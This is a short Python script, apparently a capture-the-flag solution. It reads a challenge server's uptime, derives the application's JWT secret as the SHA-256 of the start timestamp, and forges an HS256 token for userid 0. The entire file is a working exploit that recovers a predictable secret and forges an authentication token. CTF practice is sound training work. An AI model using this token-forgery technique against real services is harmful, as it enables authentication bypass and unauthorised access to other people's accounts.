import requests 
import time
import hashlib
import jwt

cookies = {
    "session": "help"
}

x = requests.get('https://random.chal.cyberjousting.com/',cookies=cookies)
time_passed = int(x.text.split('for ')[1].split(' ')[0])
print(time_passed)
current_time = round(time.time())
print(current_time)
time_started = current_time - time_passed
APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()

print(APP_SECRET)

encoded_jwt = jwt.encode({
    "userid":0
}, APP_SECRET, algorithm='HS256')

print('encoded_jwt:', encoded_jwt)